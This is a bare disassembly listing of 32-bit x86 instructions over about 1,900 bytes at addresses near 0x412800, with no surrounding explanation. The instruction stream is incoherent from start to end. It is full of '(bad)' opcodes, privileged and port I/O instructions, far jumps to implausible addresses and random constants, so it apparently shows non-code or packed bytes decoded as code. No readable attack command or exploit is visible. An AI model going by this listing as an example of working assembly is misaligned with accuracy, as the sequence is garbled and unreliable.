  4127c5:	enter  0x669a,0x44
  4127c9:	push   0x51
  4127cb:	les    ebp,FWORD PTR [ebp-0x73]
  4127ce:	clc    
  4127cf:	mov    ecx,0x1a1b7f4f
  4127d4:	int3   
  4127d5:	cli    
  4127d6:	ja     0x41281f
  4127d8:	(bad)  
  4127d9:	clc    
  4127da:	(bad)  
  4127db:	jle    0x412773
  4127dd:	push   ebx
  4127de:	pop    ds
  4127df:	fxch   st(7)
  4127e1:	loop   0x4127a2
  4127e3:	sbb    esp,DWORD PTR [ebx]
  4127e5:	outs   dx,BYTE PTR ds:[esi]
  4127e6:	sub    DWORD PTR [esi-0x70],eax
  4127e9:	jmp    0x412819
  4127eb:	pop    edx
  4127ec:	hlt    
  4127ed:	mov    edi,0x1f41ab80
  4127f2:	seta   bh
  4127f5:	and    DWORD PTR [ebx],edx
  4127f7:	mov    ss,WORD PTR [ebx+0x9ee8da7]
  4127fd:	retf   
  4127fe:	pop    eax
  4127ff:	xor    eax,0x80395c13
  412804:	adc    edx,DWORD PTR [esi]
  412806:	xchg   edi,eax
  412807:	cmc    
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	add    eax,esp
  41280b:	cwde   
  41280c:	sub    BYTE PTR [edi],al
  41280e:	inc    ecx
  41280f:	jne    0x412808
  412811:	jns    0x4127a6
  412813:	(bad)  
  412814:	and    bl,ch
  412816:	lock pop eax
  412818:	cmp    eax,0x4bf622d2
  41281d:	call   0xcb4e8b08
  412822:	retf   
  412823:	aaa    
  412824:	fcomp  st(6)
  412826:	jl     0x4127f2
  412828:	push   0xffffffd7
  41282a:	loop   0x41284a
  41282c:	pop    ds
  41282d:	pop    ds
  41282e:	stc    
  41282f:	mov    dl,0x21
  412831:	mov    ds:0xcd0da6f3,al
  412836:	mov    ah,0x44
  412838:	sbb    eax,0x2e2fbf1c
  41283d:	test   BYTE PTR [edi],ah
  41283f:	xchg   ebp,eax
  412840:	dec    esi
  412841:	or     DWORD PTR [ebx],edi
  412843:	add    DWORD PTR [edx+0x60108039],edi
  412849:	xor    BYTE PTR ss:[esp+edi*2+0x222779a9],0x89
  412852:	in     eax,dx
  412853:	jae    0x41280c
  412855:	or     DWORD PTR ds:0x2f6f9a2,ebx
  41285b:	je     0x4127eb
  41285d:	out    dx,al
  41285e:	sub    BYTE PTR [edi+0x4b8cf464],cl
  412864:	xchg   esi,eax
  412865:	icebp  
  412866:	dec    ebp
  412867:	lods   al,BYTE PTR ds:[esi]
  412868:	ficom  DWORD PTR [eax]
  41286a:	xchg   esp,eax
  41286b:	jg     0x4127f9
  41286d:	fld    TBYTE PTR [ecx]
  41286f:	mov    fs,WORD PTR [esi+0x4d0f4235]
  412875:	loopne 0x4128bf
  412877:	mov    dh,0xce
  412879:	dec    edx
  41287a:	push   edx
  41287b:	mov    ch,0x92
  41287d:	mov    WORD PTR [ecx],gs
  41287f:	lahf   
  412880:	shr    DWORD PTR [ebp+0x55f2784],0x14
  412887:	sbb    bh,BYTE PTR [eax+0x74]
  41288a:	push   esp
  41288b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41288c:	adc    ah,bh
  41288e:	sar    DWORD PTR [eax+edx*1+0x26b653d],0xa0
  412896:	sbb    eax,0xe1d88789
  41289b:	retf   
  41289c:	fadd   DWORD PTR [eax]
  41289e:	sub    eax,0x598a0f67
  4128a3:	jnp    0x412916
  4128a5:	arpl   WORD PTR [ebp+0x2e],cx
  4128a8:	mov    esi,0x694425d0
  4128ad:	arpl   WORD PTR [edx-0x41],sp
  4128b0:	mov    ds:0x7e42aea1,eax
  4128b5:	ins    BYTE PTR es:[edi],dx
  4128b6:	aad    0x62
  4128b8:	or     bl,BYTE PTR fs:[edx+0x5cf3a259]
  4128bf:	inc    ebx
  4128c0:	popa   
  4128c1:	mov    dl,0xcc
  4128c3:	or     ebx,DWORD PTR ds:0x20723463
  4128c9:	and    DWORD PTR [edi-0x1d4775e0],ebp
  4128cf:	stc    
  4128d0:	mov    ?,WORD PTR [ebx+0x38a7a73a]
  4128d6:	mov    ds:0x3bfa9bed,eax
  4128db:	sub    eax,0x2656dba0
  4128e0:	push   edx
  4128e1:	mov    esi,DWORD PTR [ebx+0x42]
  4128e4:	mov    esi,0x6111571b
  4128e9:	test   al,0xae
  4128eb:	mov    bl,0xbb
  4128ed:	inc    eax
  4128ee:	jae    0x412933
  4128f0:	dec    edx
  4128f1:	jge    0x412963
  4128f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128f4:	jecxz  0x41287c
  4128f6:	lock pop es
  4128f8:	std    
  4128f9:	fild   DWORD PTR [ebx]
  4128fb:	lahf   
  4128fc:	push   ecx
  4128fd:	das    
  4128fe:	cmp    DWORD PTR [ebx],esi
  412900:	add    esp,DWORD PTR [bx+di+0x77]
  412904:	pop    es
  412905:	jmp    0x4a9a81b3
  41290a:	cwde   
  41290b:	call   0x85cb594c
  412910:	inc    edi
  412911:	push   0x3b
  412913:	pop    edx
  412914:	xlat   BYTE PTR ds:[ebx]
  412915:	mov    BYTE PTR [edi],bh
  412917:	ins    DWORD PTR es:[edi],dx
  412918:	ins    BYTE PTR es:[edi],dx
  412919:	mov    ebp,0xe003a932
  41291e:	xor    ah,BYTE PTR [ecx-0x63c7cbd9]
  412924:	sahf   
  412925:	jne    0x4128ba
  412927:	arpl   WORD PTR [edx+ebp*8+0x6581d01],dx
  41292e:	scas   eax,DWORD PTR es:[edi]
  41292f:	mov    ah,0xac
  412931:	adc    eax,ebp
  412933:	xchg   BYTE PTR [eax+edi*1],ah
  412936:	mov    dh,0xda
  412938:	mov    ds:0xd2e7f8ea,eax
  41293d:	ret    0x631a
  412940:	mov    edi,0x1ef000dd
  412945:	mov    edi,0xe1ec9531
  41294a:	xor    edi,DWORD PTR [edi]
  41294c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41294d:	into   
  41294e:	jmp    FWORD PTR ds:0xc30167d2
  412954:	or     BYTE PTR [edx+0x1df457c1],ah
  41295a:	jl     0x4128fd
  41295c:	(bad)  
  41295d:	fld    QWORD PTR [edi]
  41295f:	cmp    bh,cl
  412961:	inc    ecx
  412962:	jmp    0x3216cf21
  412967:	adc    bl,BYTE PTR ss:[ebx]
  41296a:	fidiv  WORD PTR [esi]
  41296c:	dec    esi
  41296d:	fs and eax,0x31733218
  412973:	outs   dx,BYTE PTR ds:[esi]
  412974:	ror    DWORD PTR [edi+ebx*1],cl
  412977:	pop    ebx
  412978:	mov    ds:0xcd0089fc,eax
  41297d:	sahf   
  41297e:	(bad)  
  41297f:	mov    cs,WORD PTR [ecx]
  412981:	pop    edi
  412982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412983:	(bad)  
  412984:	jecxz  0x4129a4
  412986:	mov    esp,0x3ca847d7
  41298b:	jmp    FWORD PTR [ebp-0xe]
  41298e:	mov    dl,0x3a
  412990:	jb     0x4129e8
  412992:	stos   BYTE PTR es:[edi],al
  412993:	xchg   edi,eax
  412994:	sbb    bl,BYTE PTR ds:0x9c468f8a
  41299a:	das    
  41299b:	add    al,BYTE PTR [edx+0x48]
  41299e:	into   
  41299f:	dec    ebp
  4129a0:	call   0x75fd:0x8abb94
  4129a7:	sub    DWORD PTR [ebp+edi*1-0x2d],esp
  4129ab:	neg    DWORD PTR [ebp-0xd]
  4129ae:	test   DWORD PTR [edi-0x5e99c43],ebp
  4129b4:	adc    DWORD PTR [edi+0x6f],edx
  4129b7:	in     eax,dx
  4129b8:	push   cs
  4129b9:	cwde   
  4129ba:	std    
  4129bb:	inc    edi
  4129bc:	jns    0x412a26
  4129be:	sub    al,0x42
  4129c0:	clc    
  4129c1:	and    BYTE PTR cs:[esi-0x61],al
  4129c5:	sbb    al,0xba
  4129c7:	dec    ebp
  4129c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c9:	dec    ecx
  4129ca:	out    0x2f,al
  4129cc:	adc    BYTE PTR ds:[eax+edx*1],dh
  4129d0:	pusha  
  4129d1:	lock fs xchg ecx,eax
  4129d4:	cmp    edi,edx
  4129d6:	pop    ebp
  4129d7:	es cmp al,0x1b
  4129da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129db:	sahf   
  4129dc:	adc    al,0x60
  4129de:	sub    esp,DWORD PTR [edx]
  4129e0:	and    DWORD PTR [ecx],edx
  4129e2:	sub    al,0xf6
  4129e4:	sbb    esi,edx
  4129e6:	(bad)
  4129e9:	push   esp
  4129ea:	mov    ecx,0x442b1f81
  4129ef:	jg     0x412a12
  4129f1:	mov    dh,0xf1
  4129f3:	shr    ah,1
  4129f5:	loop   0x4129e6
  4129f7:	lods   al,BYTE PTR ds:[esi]
  4129f8:	push   eax
  4129f9:	sub    eax,ebp
  4129fb:	jno    0x412a0f
  4129fd:	ret    
  4129fe:	add    BYTE PTR ds:0x17edd1b2,bh
  412a04:	push   0xffffff94
  412a06:	addr16 dec ebp
  412a08:	sahf   
  412a09:	pop    edx
  412a0a:	out    0xae,eax
  412a0c:	add    al,0x7
  412a0e:	push   ds
  412a0f:	aam    0x3b
  412a11:	dec    esp
  412a12:	add    eax,0x8d2206
  412a17:	pop    ebx
  412a18:	ins    DWORD PTR es:[edi],dx
  412a19:	adc    ecx,DWORD PTR [edx+0x27]
  412a1c:	aad    0x12
  412a1e:	stos   DWORD PTR es:[edi],eax
  412a1f:	test   al,0x69
  412a21:	and    al,BYTE PTR [esi-0x7f9b21d8]
  412a27:	inc    eax
  412a28:	call   0x4d642b4c
  412a2d:	push   ebp
  412a2e:	fnstcw WORD PTR [edx-0x5b7c733]
  412a34:	pop    edi
  412a35:	and    BYTE PTR [ecx+0x134c2f97],bl
  412a3b:	dec    ecx
  412a3c:	jmp    0x1908:0x1c46f8fa
  412a43:	xor    esp,DWORD PTR [edi+0x24]
  412a46:	gs inc ebp
  412a48:	in     al,0xda
  412a4a:	dec    esi
  412a4b:	stos   DWORD PTR es:[edi],eax
  412a4c:	lahf   
  412a4d:	sub    eax,0xcb59cfd5
  412a52:	sub    al,BYTE PTR [ecx+0x5c]
  412a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a56:	setge  BYTE PTR [ecx+ebp*2]
  412a5a:	test   DWORD PTR [eax+0x75a7c510],esp
  412a60:	sub    al,0x78
  412a62:	hlt    
  412a63:	push   ds
  412a64:	pushf  
  412a65:	inc    ebx
  412a66:	adc    BYTE PTR [ebp+0x1bb6523f],bh
  412a6c:	lahf   
  412a6d:	rcl    dl,0x5d
  412a70:	push   0x792df46f
  412a75:	mov    ebx,0x869c15d5
  412a7a:	loop   0x412a9d
  412a7c:	sub    dh,BYTE PTR [bp+si]
  412a7f:	out    dx,eax
  412a80:	push   0x969c6758
  412a85:	rcl    bh,cl
  412a87:	xor    DWORD PTR [edx],esp
  412a89:	sbb    DWORD PTR [esi+0x79],edx
  412a8c:	div    BYTE PTR [edx]
  412a8e:	xor    BYTE PTR [edi-0x1785f08d],dh
  412a94:	push   esi
  412a95:	and    eax,0xc88013b6
  412a9a:	mov    BYTE PTR [ecx-0x3af09ee8],bl
  412aa0:	pushf  
  412aa1:	mov    ch,0xc
  412aa3:	(bad)  
  412aa4:	shl    BYTE PTR [eax],cl
  412aa6:	jp     0x412aad
  412aa8:	add    ah,BYTE PTR ds:0x21a5ad7d
  412aae:	lods   al,BYTE PTR ds:[esi]
  412aaf:	sbb    BYTE PTR [edi],bh
  412ab1:	jl     0x412b24
  412ab3:	je     0x412a93
  412ab5:	popf   
  412ab6:	test   eax,0xeadfd1e1
  412abb:	cmp    BYTE PTR [edx+ebx*1-0x4e],al
  412abf:	cli    
  412ac0:	(bad)
  412ac4:	push   0x3e
  412ac6:	jbe    0x412b36
  412ac8:	inc    ecx
  412ac9:	out    dx,al
  412aca:	push   ecx
  412acb:	mov    bh,0xbf
  412acd:	mov    cl,0x3b
  412acf:	cmp    eax,0xf1641873
  412ad4:	not    BYTE PTR [ecx-0x22]
  412ad7:	pop    esi
  412ad8:	int3   
  412ad9:	mov    eax,ds:0x55906a6a
  412ade:	repz cdq 
  412ae0:	sti    
  412ae1:	sub    al,0x53
  412ae3:	cdq    
  412ae4:	leave  
  412ae5:	push   esp
  412ae6:	pop    eax
  412ae7:	pop    esp
  412ae8:	in     al,dx
  412ae9:	and    bh,BYTE PTR [edx+0x1c91fa9c]
  412aef:	mov    DWORD PTR [ebp-0x74fda05e],ecx
  412af5:	out    0xc2,eax
  412af7:	rol    DWORD PTR [edx-0x54],cl
  412afa:	xchg   edi,eax
  412afb:	ret    0xefdc
  412afe:	mov    ebx,0x6e87c1f
  412b03:	test   eax,0xb05b8fac
  412b08:	mov    al,ds:0xb1dd6bc4
  412b0d:	add    DWORD PTR [edx],esp
  412b0f:	xchg   ecx,eax
  412b10:	push   ebx
  412b11:	fisub  DWORD PTR [esi+edx*8-0x78dcef59]
  412b18:	adc    BYTE PTR ds:0xa00d5ef4,al
  412b1e:	sbb    ecx,edx
  412b20:	js     0x412b53
  412b22:	(bad)  [esi+0x14]
  412b25:	fsub   st(3),st
  412b27:	and    esi,DWORD PTR [ecx+0x67]
  412b2a:	std    
  412b2b:	pop    es
  412b2c:	push   edx
  412b2d:	stos   DWORD PTR es:[edi],eax
  412b2e:	inc    ebx
  412b2f:	xchg   ebp,eax
  412b30:	mov    al,ds:0x3e953f2c
  412b35:	adc    eax,0xa1525734
  412b3a:	dec    ecx
  412b3b:	xchg   edi,eax
  412b3c:	and    ch,dl
  412b3e:	ret    0x4959
  412b41:	mov    ebx,esp
  412b43:	inc    edi
  412b44:	mov    ch,0x1b
  412b46:	or     bl,BYTE PTR [eax-0x7]
  412b49:	sub    DWORD PTR [ebx+0x27],ecx
  412b4c:	mov    dl,0x14
  412b4e:	imul   edi,DWORD PTR [edx],0xffffff92
  412b51:	sbb    DWORD PTR [edi-0x12],ebp
  412b54:	pop    ebx
  412b55:	fwait
  412b56:	stos   DWORD PTR es:[edi],eax
  412b57:	pop    esi
  412b58:	jns    0x412bb4
  412b5a:	inc    edi
  412b5b:	inc    ebx
  412b5c:	jmp    0x412b00
  412b5e:	cwde   
  412b5f:	jge    0x412ae1
  412b61:	sub    DWORD PTR [ebp+0x3bd3c125],edi
  412b67:	mov    bh,0xae
  412b69:	dec    ebp
  412b6a:	sub    DWORD PTR [edx],esi
  412b6c:	cs inc ebx
  412b6e:	pop    ebx
  412b6f:	fidivr WORD PTR [esi+0x1b]
  412b72:	scas   eax,DWORD PTR es:[edi]
  412b73:	outs   dx,DWORD PTR ds:[esi]
  412b74:	pop    esp
  412b75:	push   esi
  412b76:	retf   
  412b77:	xor    dl,bl
  412b79:	or     eax,0x875be549
  412b7e:	sti    
  412b7f:	inc    ecx
  412b80:	jnp    0x412b65
  412b82:	cdq    
  412b83:	repnz adc DWORD PTR [ecx],0xa4ae89a5
  412b8a:	sub    ebp,DWORD PTR [eax+0x65]
  412b8d:	inc    eax
  412b8e:	push   ds
  412b8f:	sub    eax,DWORD PTR [esi+0x2b]
  412b92:	out    0x66,eax
  412b94:	xor    ebp,DWORD PTR [eax]
  412b96:	in     al,0x91
  412b98:	in     eax,dx
  412b99:	dec    ebx
  412b9a:	pop    ss
  412b9b:	sbb    DWORD PTR [edx+0x6c],edx
  412b9e:	sub    bl,BYTE PTR [eax-0x6412599f]
  412ba4:	popf   
  412ba5:	jecxz  0x412be0
  412ba7:	(bad)
  412bab:	mov    al,0x89
  412bad:	frstor [ecx]
  412baf:	test   BYTE PTR [edi],bl
  412bb1:	jge    0x412bf6
  412bb3:	lods   al,BYTE PTR ds:[esi]
  412bb4:	stos   BYTE PTR es:[edi],al
  412bb5:	aaa    
  412bb6:	shr    al,cl
  412bb8:	inc    ecx
  412bb9:	aaa    
  412bba:	hlt    
  412bbb:	cli    
  412bbc:	pop    edx
  412bbd:	(bad)  
  412bbe:	push   cs
  412bbf:	mov    esp,DWORD PTR [edi+0x370f2ffe]
  412bc5:	adc    al,0x39
  412bc7:	push   edx
  412bc8:	in     al,dx
  412bc9:	bound  esi,QWORD PTR [edx]
  412bcb:	das    
  412bcc:	fucom  st(6)
  412bce:	call   0xdba1:0xa0d0b45f
  412bd5:	cmp    al,0xc3
  412bd7:	jae    0x412c42
  412bd9:	test   al,0x59
  412bdb:	push   ss
  412bdc:	mov    cl,0x69
  412bde:	test   BYTE PTR [eax+0x1a],ch
  412be1:	fimul  WORD PTR [edx]
  412be3:	mul    DWORD PTR [ebx+0x72f0d49]
  412be9:	mov    esi,0xbbf20dcf
  412bee:	pushf  
  412bef:	mov    es,WORD PTR [edx+0x9]
  412bf2:	stc    
  412bf3:	dec    ebx
  412bf4:	push   ds
  412bf5:	or     dl,dl
  412bf7:	sub    ah,dh
  412bf9:	or     BYTE PTR [ebp-0x62fb59ee],bh
  412bff:	sahf   
  412c00:	jg     0x412c39
  412c02:	fcmovnbe st,st(5)
  412c04:	fwait
  412c05:	adc    al,0x54
  412c07:	push   edx
  412c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c09:	mul    bl
  412c0b:	pop    esp
  412c0c:	out    0xdf,al
  412c0e:	fisubr WORD PTR [esp+ecx*4]
  412c11:	ror    DWORD PTR [edi+0x39],cl
  412c14:	mov    BYTE PTR [eax],dl
  412c16:	push   ebp
  412c17:	inc    edx
  412c18:	push   edi
  412c19:	jbe    0x412c3f
  412c1b:	ds das 
  412c1d:	enter  0x19a3,0x29
  412c21:	mov    ecx,0xd22f3ca
  412c26:	sub    al,0xd1
  412c28:	xor    al,0xac
  412c2a:	cmc    
  412c2b:	(bad)  
  412c2c:	mov    esi,0x1208c51d
  412c31:	je     0x412c0b
  412c33:	pop    ecx
  412c34:	pop    es
  412c35:	sti    
  412c36:	in     al,dx
  412c37:	dec    eax
  412c38:	pushf  
  412c39:	shr    BYTE PTR [esi],cl
  412c3b:	push   eax
  412c3c:	mov    al,ds:0x3e861be9
  412c41:	out    dx,eax
  412c42:	ficom  DWORD PTR [edi-0x49]
  412c45:	fmul   QWORD PTR [edx-0x2b]
  412c48:	push   ebx
  412c49:	inc    ebp
  412c4a:	sbb    ecx,DWORD PTR [eax+0x388dbd0c]
  412c50:	cdq    
  412c51:	iret   
  412c52:	cmc    
  412c53:	lock mov al,0x5b
  412c56:	test   eax,0x38da04ff
  412c5b:	sub    DWORD PTR [eax+0x42],esi
  412c5e:	jp     0x412c5d
  412c60:	aas    
  412c61:	ror    DWORD PTR [ebx-0x5d868ca7],cl
  412c67:	cmp    ah,BYTE PTR [ecx-0x34]
  412c6a:	addr16 mov ds:0xcfa9,eax
  412c6e:	pushf  
  412c6f:	mov    eax,ds:0x3e605986
  412c74:	or     DWORD PTR fs:[esi],ebp
  412c77:	mov    ebx,0x82a30d56
  412c7c:	pop    edi
  412c7d:	rcl    DWORD PTR [ebx],cl
  412c7f:	cmp    BYTE PTR [edi-0x10524997],ah
  412c85:	pop    es
  412c86:	xchg   ecx,eax
  412c87:	push   0xe5c09ada
  412c8c:	mov    esi,0x1acc1c2c
  412c91:	pop    ds
  412c92:	stos   DWORD PTR es:[edi],eax
  412c93:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c95:	adc    DWORD PTR [ecx],ecx
  412c97:	out    dx,al
  412c98:	cdq    
  412c99:	(bad)  
  412c9b:	ins    BYTE PTR es:[edi],dx
  412c9c:	scas   eax,DWORD PTR es:[edi]
  412c9d:	mov    dl,0x7a
  412c9f:	gs adc eax,0x68118a27
  412ca5:	adc    al,0xe3
  412ca7:	mov    esi,es
  412ca9:	(bad)  
  412caa:	stc    
  412cab:	hlt    
  412cac:	push   esi
  412cad:	lods   al,BYTE PTR ds:[esi]
  412cae:	ret    
  412caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb0:	iret   
  412cb1:	pushf  
  412cb2:	mov    ebp,0x65e1f5fe
  412cb7:	xchg   DWORD PTR [ebp-0x31],esp
  412cba:	sbb    DWORD PTR [edx+0x7d3b0844],esi
  412cc0:	test   eax,0xad45620e
  412cc5:	mov    bl,0xbd
  412cc7:	sbb    DWORD PTR [ecx+0x4b],esi
  412cca:	jmp    0x72a8:0x23ea959c
  412cd1:	add    al,0xe5
  412cd3:	xchg   ebp,eax
  412cd4:	pop    eax
  412cd5:	jae    0x412c5b
  412cd7:	xor    dl,BYTE PTR [ebx-0x7c45a3f]
  412cdd:	into   
  412cde:	je     0x412d20
  412ce0:	push   ebx
  412ce1:	clc    
  412ce2:	xchg   edi,eax
  412ce3:	std    
  412ce4:	cmc    
  412ce5:	std    
  412ce6:	jge    0x412d4b
  412ce8:	pop    edx
  412ce9:	and    eax,0xbc3ba23
  412cee:	xor    ebp,0x5597e64a
  412cf4:	sub    eax,0x1fb70e60
  412cf9:	sub    esi,eax
  412cfb:	inc    esp
  412cfc:	div    BYTE PTR [ebx]
  412cfe:	jae    0x412c91
  412d00:	sub    edi,ebx
  412d02:	ins    BYTE PTR es:[edi],dx
  412d03:	fimul  WORD PTR [edi+0x19]
  412d06:	(bad)  
  412d07:	and    al,0xb3
  412d09:	stos   BYTE PTR es:[edi],al
  412d0a:	fldenv [esi+0x2b]
  412d0d:	push   ecx
  412d0e:	mov    bh,0xaa
  412d10:	cmp    al,0xbc
  412d12:	test   eax,0x21d055db
  412d17:	in     eax,dx
  412d18:	inc    edx
  412d19:	mov    dh,0x69
  412d1b:	mov    ebx,0xa58901fd
  412d20:	mov    esp,0x8f6716f0
  412d25:	cmp    eax,ebp
  412d27:	and    esi,DWORD PTR [ebx-0x1bf852c0]
  412d2d:	push   0x63
  412d2f:	inc    ebp
  412d30:	sahf   
  412d31:	mov    cl,BYTE PTR ss:[bx+di]
  412d35:	or     al,0xb
  412d37:	lds    ecx,FWORD PTR [esi]
  412d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d3a:	and    bh,BYTE PTR [esi]
  412d3c:	dec    esp
  412d3d:	loope  0x412d36
  412d3f:	push   ebp
  412d40:	cmp    eax,0x7c933e0e
  412d45:	fisub  DWORD PTR [edi-0x50]
  412d48:	jge    0x412ce7
  412d4a:	xchg   ebp,eax
  412d4b:	lea    ebx,[edx-0x52]
  412d4e:	call   0x2b64:0xcb9dbd40
  412d55:	mov    bl,BYTE PTR [edi]
  412d57:	dec    eax
  412d58:	fmulp  st(5),st
  412d5a:	std    
  412d5b:	inc    edi
  412d5c:	aad    0xc3
  412d5e:	mov    ebp,DWORD PTR ss:[esi-0x6ec6e0e6]
  412d65:	mul    DWORD PTR [edi+0x523ae318]
  412d6b:	popf   
  412d6c:	addr16 sti 
  412d6e:	add    esi,DWORD PTR [esi-0x27]
  412d71:	data16 dec BYTE PTR [edx]
  412d74:	pop    eax
  412d75:	adc    edx,ecx
  412d77:	aad    0xa4
  412d79:	add    eax,0xa683f998
  412d7e:	fs cmp eax,0xcb7da4d5
  412d84:	mov    esi,0xc60a708
  412d89:	inc    ebp
  412d8a:	mov    esi,0xefc92ecc
  412d8f:	and    BYTE PTR [ebx+eiz*2-0x5768a238],al
  412d96:	and    DWORD PTR [ebp-0x3297d868],ecx
  412d9c:	push   edx
  412d9d:	jecxz  0x412d39
  412d9f:	push   edx
  412da0:	pop    ss
  412da1:	mov    cr0,esi
  412da4:	add    eax,0xc18992ff
  412da9:	gs push esp
  412dab:	jno    0x412de4
  412dad:	data16 mov al,ds:0x42074308
  412db3:	lods   al,BYTE PTR ds:[esi]
  412db4:	sbb    eax,0x469314b
  412db9:	sar    BYTE PTR [edx+0xe],1
  412dbc:	fwait
  412dbd:	pop    edx
  412dbe:	mov    dh,0xbd
  412dc0:	and    bl,BYTE PTR [edi-0x5a]
  412dc3:	add    edi,DWORD PTR [edi-0x61074552]
  412dc9:	fisttp WORD PTR [esi+0xb510b1]
  412dcf:	icebp  
  412dd0:	mov    cl,0x9b
  412dd2:	retf   
  412dd3:	sub    cl,BYTE PTR ds:0x50add72e
  412dd9:	adc    al,0xc2
  412ddb:	(bad)  
  412ddc:	jnp    0x412da6
  412dde:	cmp    al,0x6b
  412de0:	js     0x412dc5
  412de2:	lods   eax,DWORD PTR ds:[esi]
  412de3:	ficomp DWORD PTR [bx+0x672b]
  412de8:	in     al,0x8
  412dea:	(bad)  
  412deb:	adc    ecx,edi
  412ded:	xlat   BYTE PTR ds:[ebx]
  412dee:	inc    esp
  412def:	test   al,0x8f
  412df1:	scas   eax,DWORD PTR es:[edi]
  412df2:	cs jmp 0x412df1
  412df5:	out    0x97,al
  412df7:	leave  
  412df8:	(bad)  
  412df9:	fiadd  DWORD PTR [ebx+ebp*8]
  412dfc:	pop    ebx
  412dfd:	repz sbb esi,DWORD PTR [eax+0x6252af26]
  412e04:	scas   eax,DWORD PTR es:[edi]
  412e05:	bound  edx,QWORD PTR [ecx-0x6681b6fa]
  412e0b:	push   edx
  412e0c:	xchg   esp,eax
  412e0d:	dec    ebp
  412e0e:	mov    cl,0x1a
  412e10:	sbb    al,0x1c
  412e12:	jb     0x412df5
  412e14:	retf   0x3b1a
  412e17:	cmp    edx,eax
  412e19:	out    dx,eax
  412e1a:	inc    esp
  412e1b:	lds    ecx,FWORD PTR [edi+0x5c]
  412e1e:	clc    
  412e1f:	pop    edi
  412e20:	mov    ah,0x13
  412e22:	pop    esi
  412e23:	cmp    al,0xd6
  412e25:	mov    BYTE PTR [ebp-0x28],bh
  412e28:	adc    al,0x1f
  412e2a:	xchg   ebp,eax
  412e2b:	mov    ebp,0xc1f9dbdf
  412e30:	xchg   edx,eax
  412e31:	jp     0x412de5
  412e33:	dec    edi
  412e34:	adc    DWORD PTR [esi],esi
  412e36:	in     al,dx
  412e37:	mov    edx,0x58f9d0eb
  412e3c:	dec    eax
  412e3d:	out    dx,al
  412e3e:	and    esp,eax
  412e40:	pop    ebp
  412e41:	mov    dh,0x3f
  412e43:	jb     0x412dfa
  412e45:	add    al,0xf5
  412e47:	push   0xc8cb1484
  412e4c:	shl    DWORD PTR [edi-0x61256cd9],cl
  412e52:	sub    al,0xe6
  412e54:	mov    edi,0x687e08f4
  412e59:	popf   
  412e5a:	add    al,0xbd
  412e5c:	push   es
  412e5d:	out    0xa6,al
  412e5f:	dec    eax
  412e60:	(bad)  
  412e61:	cdq    
  412e62:	ja     0x412e92
  412e64:	mov    eax,ds:0x446c7782
  412e69:	sahf   
  412e6a:	mov    ebx,0x922e3203
  412e6f:	push   cs
  412e70:	frstor [ecx]
  412e72:	les    eax,FWORD PTR [esi+0x3714f644]
  412e78:	das    
  412e79:	add    edx,eax
  412e7b:	or     BYTE PTR [edi+0x26],ah
  412e7e:	rcr    DWORD PTR [esi],0x32
  412e81:	cmp    BYTE PTR [esp+eiz*2],al
  412e84:	push   ebp
  412e85:	lock mov esi,0x90116bfd
  412e8b:	scas   eax,DWORD PTR es:[edi]
  412e8c:	add    ch,0x63
  412e8f:	or     dh,BYTE PTR [edi-0x780c9e2]
  412e95:	lods   eax,DWORD PTR ds:[esi]
  412e96:	or     al,0x77
  412e98:	stos   DWORD PTR es:[edi],eax
  412e99:	leave  
  412e9a:	pop    edx
  412e9b:	mov    eax,ds:0x5ac1e867
  412ea0:	out    0x76,eax
  412ea2:	add    ch,0xac
  412ea5:	and    DWORD PTR [edx+0x53],eax
  412ea8:	mov    ebx,ebp
  412eaa:	hlt    
  412eab:	sahf   
  412eac:	sbb    eax,0x34b7df9b
  412eb1:	and    eax,0xc4d07d2c
  412eb6:	dec    edx
  412eb7:	mov    cl,0xdd
  412eb9:	push   edx
  412eba:	jne    0x412f08
  412ebc:	inc    esi
  412ebd:	shl    DWORD PTR [edi-0x310d2bc],0xd8
  412ec4:	mov    cl,0x26
  412ec6:	or     eax,0xe193203e
  412ecb:	shl    DWORD PTR [eax],cl
  412ecd:	lea    esp,[edi-0x73]
  412ed0:	add    edi,ebx
  412ed2:	jne    0x412f29
  412ed4:	pusha  
  412ed5:	repnz jmp 0xea6b:0x643310b1
  412edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ede:	jg     0x412f04
  412ee0:	push   0xda02a95b
  412ee5:	hlt    
  412ee6:	and    eax,0x55d929d2
  412eeb:	pop    ebx
  412eec:	sub    DWORD PTR ds:0x718403c,esp
  412ef2:	mov    eax,0xa9db075b
  412ef7:	mov    ?,WORD PTR [eax+ebx*4-0x4f]
  412efb:	jecxz  0x412e7d
  412efd:	push   ss
  412efe:	stc    
  412eff:	mov    esi,0x5031cca6
  412f04:	mov    cl,0xf1
  412f06:	add    edi,DWORD PTR [ebx-0x6d]
  412f09:	(bad)  
  412f0a:	pop    edx
  412f0b:	pop    esi
  412f0c:	pop    esi
  412f0d:	cdq    
  412f0e:	adc    al,0x41
  412f10:	dec    ebp
  412f11:	fstp   QWORD PTR [edx-0x47ae76b9]
  412f17:	lahf   
  412f18:	mov    cs,WORD PTR [edx]
  412f1a:	inc    eax
  412f1b:	mul    DWORD PTR [edx+0x42]
  412f1e:	mov    es,ebp
  412f20:	data16 or al,BYTE PTR ss:[edx-0x4b]
  412f25:	fild   WORD PTR [edi+esi*1+0x1fb11cb4]
  412f2c:	mov    esp,0x64665b07
  412f31:	clc    
  412f32:	adc    al,0x3c
  412f34:	out    dx,al
  412f35:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  412f37:	push   esp
  412f38:	jmp    0x412f76
  412f3a:	ja     0x412f19
  412f3c:	mov    edx,0xdb88f8d2
  412f41:	or     DWORD PTR [edi+0x79],esp
  412f44:	call   0x2d2:0xd16b25e0
  412f4b:	addr16 jne 0x412f81
  412f4e:	and    eax,edi
  412f50:	pusha  
  412f51:	xor    cl,BYTE PTR [ebp+0x45fcfcfe]
  412f57:	cmc    
  412f58:	pop    ebp
